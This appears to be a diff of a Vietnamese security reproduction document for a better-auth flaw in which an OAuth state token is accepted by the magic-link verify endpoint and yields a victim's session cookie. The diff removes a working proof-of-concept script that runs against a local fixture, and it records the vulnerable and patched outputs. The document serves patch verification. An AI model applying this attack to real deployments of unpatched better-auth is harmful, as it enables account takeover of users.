@@ -15,132 +15,129 @@ Tài liệu này cung cấp hướng dẫn và mã nguồn để tái lập đ�
 - Better Auth bắt buộc phân tách tiền tố namespace trong bảng `verification`:
   - Luồng OAuth lưu với tiền tố: `auth-state:<state>`.
   - Luồng Magic Link lưu với tiền tố: `magic-link:<token>`.
-- Khi kẻ tấn công gửi `state` sang `/api/auth/magic-link/verify`, hàm xác thực tìm kiếm khóa với tiền tố `magic-link:<token>` nên không khớp. Yêu cầu bị từ chối với lỗi `INVALID_TOKEN` (redirect `error=INVALID_TOKEN` hoặc HTTP 400), và **tuyệt đối không cấp session cookie**.
+- Kẻ tấn công sau đó gửi `state` sang `/api/auth/magic-link/verify`, hàm xác thực tìm kiếm khóa với tiền tố `magic-link:<token>` nên không khớp. Yêu cầu bị từ chối với lỗi `INVALID_TOKEN` (redirect `error=INVALID_TOKEN` hoặc HTTP 400), và **tuyệt đối không cấp session cookie**.
 
 ---
 
-## 2. Các Bước Tái Lập (Reproduction Steps)
+## 2. Kiến Trúc Fixture: Một Runner Dùng Chung
 
-### Bước 2.1: Chạy Tái Lập Trên Bản Đã Vá (`better-auth@1.7.7` trong repo hiện tại)
-Lệnh chạy trực tiếp từ thư mục gốc của repository:
+Cả hai bài tái lập (old-red và new-green) đều gọi **cùng một** entry point `run-reproducer.ts`, tức là cùng một đoạn setup và cùng một bộ assertion. Lý do phải dùng chung:
+
+- Nếu mỗi phiên bản có script tự viết riêng, hai script có thể trôi dạt về logic; một kết quả đỏ có thể xuất phát từ lỗi setup (thiếu `state`, đổi API, sai biến môi trường) thay vì đúng hành vi bảo mật cần chứng minh.
+- `run-reproducer.ts` đọc **phiên bản thực sự đang được nạp** từ manifest của package mà Node resolve được (`require.resolve('better-auth')`), không hề gán cứng chuỗi phiên bản trong kết quả.
+- Cờ `--expect <version>` bắt buộc phiên bản đang nạp phải khớp với phiên bản mà người chạy tuyên bố đang kiểm thử. Nếu lệch, runner thoát với mã **3** và không đưa ra bất kỳ kết luận PASS/FAIL nào.
+
+Các tệp trong fixture:
+
+| Tệp | Vai trò |
+|---|---|
+| `reproducer-core.ts` | Fixture Better Auth + luồng khai thác, trả về `ReproducerResult` (phiên bản thật đọc từ manifest, HTTP status, cookie, redirect, identifier thực tế). |
+| `run-reproducer.ts` | CLI dùng chung. In bằng chứng và kết luận; mã thoát chuẩn hóa. |
+| `package.old-red.json` + `package-lock.old-red.json` | Khóa phiên bản dễ tổn thương `1.6.29` cho bài tái lập old-red. |
+| `../integration/better-auth-ghsa-965c-reproducer.test.ts` | Bài kiểm thử new-green chạy trong CI trên nhánh PR (dùng `1.7.7` đang ghim trong `package.json`, không downgrade). |
+
+### Mã thoát (exit codes)
+
+| Mã | Nghĩa |
+|---|---|
+| `0` | Bản đã vá: không mints cookie, có tín hiệu từ chối tường minh, identifier được phân tách namespace. |
+| `1` | Bản dễ tổn thương (cookie được cấp) HOẶC bị chặn nhưng thiếu bằng chứng bản vá — không tính là xanh. |
+| `2` | Lỗi setup (reproducer không chạy hết được) — không phải kết luận bảo mật. |
+| `3` | Phiên bản đang nạp không khớp `--expect`. |
+
+---
+
+## 3. Các Bước Tái Lập (Reproduction Steps)
+
+### Bước 3.1: New-GREEN — Bản Đã Vá (`better-auth@1.7.7`, nhánh PR hiện tại)
+
+Chạy từ thư mục gốc của repository:
+
 ```bash
 npx vitest run tests/integration/better-auth-ghsa-965c-reproducer.test.ts
-```
-**Kết quả mong đợi:**
-- **PASS**:
-  - `exploitCookie === null`
-  - URL chuyển hướng chứa `error=INVALID_TOKEN`
-  - Bảng `verification` lưu trữ tiền tố tách biệt rõ `auth-state:` và `magic-link:`
-  - Token hợp lệ của Magic Link vẫn hoạt động bình thường.
-
----
-
-### Bước 2.2: Chạy Tái Lập Đối Đầu Trên Bản Cũ Chưa Vá (`better-auth@1.6.29`)
-Thực hiện trong một thư mục tạm thời độc lập ngoài repo (`/tmp/better-auth-old-reproducer`):
-
-```bash
-mkdir -p /tmp/better-auth-old-reproducer
-cd /tmp/better-auth-old-reproducer
-
-# 1. Khởi tạo package độc lập và khóa phiên bản có lỗ hổng 1.6.29
-cat << 'EOF' > package.json
-{
-  "name": "better-auth-vulnerable-reproducer",
-  "version": "1.0.0",
-  "type": "module",
-  "dependencies": {
-    "better-auth": "1.6.29"
-  }
-}
-EOF
-
-npm install --no-audit
-
-# 2. Tạo script khai thác (sử dụng cùng assertion logic)
-cat << 'EOF' > run-vulnerable.js
-import { betterAuth } from 'better-auth';
-import { magicLink } from 'better-auth/plugins';
-import { memoryAdapter } from 'better-auth/adapters/memory';
-
-async function main() {
-  console.log('[Reproducer] Testing better-auth version 1.6.29...');
-  const memoryDb = { user: [], session: [], account: [], verification: [] };
-
-  const auth = betterAuth({
-    database: memoryAdapter(memoryDb),
-    secret: 'reproducer-vulnerable-test-secret-32-chars-min!!',
-    baseURL: 'http://localhost:3000',
-    basePath: '/api/auth',
-    emailAndPassword: { enabled: true },
-    socialProviders: {
-      github: { clientId: 'mock-id', clientSecret: 'mock-secret' }
-    },
-    plugins: [
-      magicLink({
-        sendMagicLink: async () => {}
-      })
-    ]
-  });
-
-  const victimEmail = `victim_${Date.now()}@cashclaw.cc`;
-  await auth.api.signUpEmail({
-    body: { email: victimEmail, password: 'VictimPassword123!', name: 'Victim' }
-  });
-
-  const oauthInit = await auth.api.signInSocial({
-    headers: new Headers(),
-    body: {
-      provider: 'github',
-      callbackURL: 'http://localhost:3000/dashboard',
-      additionalData: { email: victimEmail }
-    }
-  });
-
-  const oauthState = new URL(oauthInit.url).searchParams.get('state');
-
-  // Attempt exploit:
-  const exploitReq = new Request(
-    `http://localhost:3000/api/auth/magic-link/verify?token=${encodeURIComponent(oauthState)}`,
-    { method: 'GET' }
-  );
-
-  const exploitRes = await auth.handler(exploitReq);
-  const setCookie = exploitRes.headers.get('set-cookie');
-
-  console.log(`[Result] HTTP Status: ${exploitRes.status}`);
-  console.log(`[Result] Set-Cookie: ${setCookie}`);
-
-  if (setCookie && setCookie.includes('better-auth.session_token')) {
-    console.log('🔴 EXPLOIT SUCCESSFUL (Vulnerable): OAuth state minted victim session cookie!');
-    process.exit(1); // Exit 1 demonstrates vulnerability
-  } else {
-    console.log('🟢 EXPLOIT BLOCKED (Patched)');
-    process.exit(0);
-  }
-}
-
-main().catch((err) => {
-  console.error('Setup error:', err);
-  process.exit(2);
-});
-EOF
-
-node run-vulnerable.js
 ```
 
 **Kết quả thực tế đã ghi nhận:**
 ```text
-[Reproducer] Testing better-auth version 1.6.29...
-[Result] HTTP Status: 200
-[Result] Set-Cookie: better-auth.session_token=s%3A...; Path=/; HttpOnly; SameSite=Lax
-🔴 EXPLOIT SUCCESSFUL (Vulnerable): OAuth state minted victim session cookie!
-Exit code: 1
+RUN v4.1.10 tests/integration/better-auth-ghsa-965c-reproducer.test.ts
+
+ Test Files  1 passed (1)
+      Tests  1 passed (1)
+   Duration  707ms
+Exit code: 0
+```
+
+Có thể chạy trực tiếp cùng runner dùng chung để lấy log chi tiết:
+
+```bash
+npx tsx tests/fixtures/better-auth-ghsa-965c/run-reproducer.ts --expect 1.7.7
+```
+
+**Kết quả thực tế đã ghi nhận:**
+```text
+[Reproducer] Loaded better-auth version: 1.7.7
+[Reproducer] Reporting version: 1.7.7
+[Reproducer] HTTP status: 302
+[Reproducer] Set-Cookie: null
+[Reproducer] Redirect location: http://localhost:3000/?error=INVALID_TOKEN
+[Reproducer] Stored identifiers: ["auth-state:gHe6si-e3d5xGqTsVi4mBSZaXwpgnHjz","magic-link:uWNbKWYCFMfFaflJYEzEWqBgganwazPD"]
+🟢 EXPLOIT BLOCKED (Patched build 1.7.7 >= 1.7.7): no cookie, explicit rejection, namespaced verification identifiers.
+Exit code: 0
 ```
 
 ---
 
-## 3. Ranh Giới Đánh Giá Khả Năng Khai Thác (Exploitability Boundaries)
+### Bước 3.2: OLD-RED — Bản Chưa Vá (`better-auth@1.6.29`)
+
+Thực hiện trong một thư mục tạm thời độc lập **ngoài** repo (không bao giờ sửa `package.json` của nhánh PR):
+
+```bash
+# 1. Tạo thư mục cách ly riêng, không nằm trong repo
+mkdir -p /tmp/ghsa965c-old-red
+cd /tmp/ghsa965c-old-red
+
+# 2. Copy đúng bộ runner/assertion dùng chung và khóa phiên bản dễ tổn thương
+cp <repo>/tests/fixtures/better-auth-ghsa-965c/reproducer-core.ts .
+cp <repo>/tests/fixtures/better-auth-ghsa-965c/run-reproducer.ts .
+cp <repo>/tests/fixtures/better-auth-ghsa-965c/package.old-red.json package.json
+cp <repo>/tests/fixtures/better-auth-ghsa-965c/package-lock.old-red.json package-lock.json
+
+# 3. Cài đặt tuyệt đối theo lockfile đã khóa (bám sát version, không resolve bản khác)
+npm ci --no-audit --no-fund
+
+# 4. Chạy.
+npx tsx run-reproducer.ts --expect 1.6.29
+```
+
+**Kết quả thực tế đã ghi nhận:**
+```text
+[Reproducer] Loaded better-auth version: 1.6.29
+[Reproducer] Reporting version: 1.6.29
+[Reproducer] HTTP status: 200
+[Reproducer] Set-Cookie: better-auth.session_token=eIZCOYjURL15cIGwnVRsJdp67t5AmorN.ka0RYF7uNduF2Rc7j64umpgt9jjM2%2BpqWrikM5Re7Cs%3D; Max-Age=604800; Path=/; HttpOnly; SameSite=Lax
+[Reproducer] Redirect location: null
+[Reproducer] Stored identifiers: ["tlXJKriODbRYSjLNZOOwaPtVuyOpxfOk"]
+🔴 EXPLOIT SUCCESSFUL (Vulnerable build 1.6.29 < 1.7.7): OAuth state minted a victim session cookie via Magic Link verify.
+Exit code: 1
+```
+
+**Xác nhận đây là đỏ do hành vi bảo mật, không phải lỗi cài đặt:**
+
+| Tín hiệu | 1.6.29 (old-red) | 1.7.7 (new-green) | Kết luận |
+|---|---|---|---|
+| HTTP status | `200` | `302` | Khác biệt, không phải crash setup |
+| `Set-Cookie` | có `better-auth.session_token` | `null` | Lỗ hổng hiện diện ở bản cũ |
+| `Redirect` | `null` | `error=INVALID_TOKEN` | Bản cũ đi thẳng vào luồng đăng nhập |
+| `verification` identifiers | `["tlXJ..."]` (token trần, không tiền tố) | `["auth-state:...","magic-link:..."]` | Nguyên nhân gốc: không phân tách namespace |
+| Exit code | `1` | `0` | Cùng một runner, cùng một assertion |
+| Phiên bản thực tế (đọc từ manifest) | `1.6.29` | `1.7.7` | Trùng khớp `--expect`, exit `≠ 3` |
+
+Setup ở cả hai lần chạy đều tới được điểm phát sinh lỗ hổng (OAuth `state` tồn tại, magic-link token tồn tại); runner sẽ thoát mã `2` nếu bất kỳ bước setup nào thất bại. Vậy đỏ/của xanh đến từ hành vi kiểm tra token, không phải cấu hình.
+
+---
+
+## 4. Ranh Giới Đánh Giá Khả Năng Khai Thác (Exploitability Boundaries)
 
 1. **Dependency Affected:** `better-auth < 1.7.7` chứa lỗ hổng logic xác thực khi dùng chung OAuth và Magic Link.
-2. **Fixture Exploitable:** Tái lập thành công trong môi trường fixture khi cấu hình cả 2 tính năng.
-3. **Production Exploitability:** Mã nguồn sản xuất `src/platform/auth/auth-server.ts` **chỉ bật `emailAndPassword`**, không bật `magicLink` hay `socialProviders`. Do đó, ứng dụng sản xuất hiện tại không bị tấn công tại runtime, nhưng việc nâng cấp lên `1.7.7` là bắt buộc để triệt tiêu vĩnh viễn vector tấn công này và vượt qua rào cản CI Gate 2 (`pnpm audit --audit-level=critical`).
+2. **Fixture Exploitable:** Có — tái lập thành công trong môi trường cô lập khi bật đồng thời hai plugin.
+3. **Production Exploitability (giới hạn theo source đã kiểm tra):** Duyệt qua `src/platform/auth/auth-server.ts` trên nhánh này, ứng dụng chỉ bật `emailAndPassword`, không bật `magicLink` hay `socialProviders`. Kết luận được rút ra **trong phạm vi đoạn mã nguồn đã kiểm tra**; nếu sau này plugin OAuth hoặc Magic Link được bật, kết luận này không còn giá trị và cần kiểm thử lại. Việc nâng cấp lên `1.7.7` bắt buộc bất kể điều đó, để xóa bỏ rủi ro ở tầng thư viện và giữ Gate 2 (`pnpm audit --audit-level=critical`) xanh.
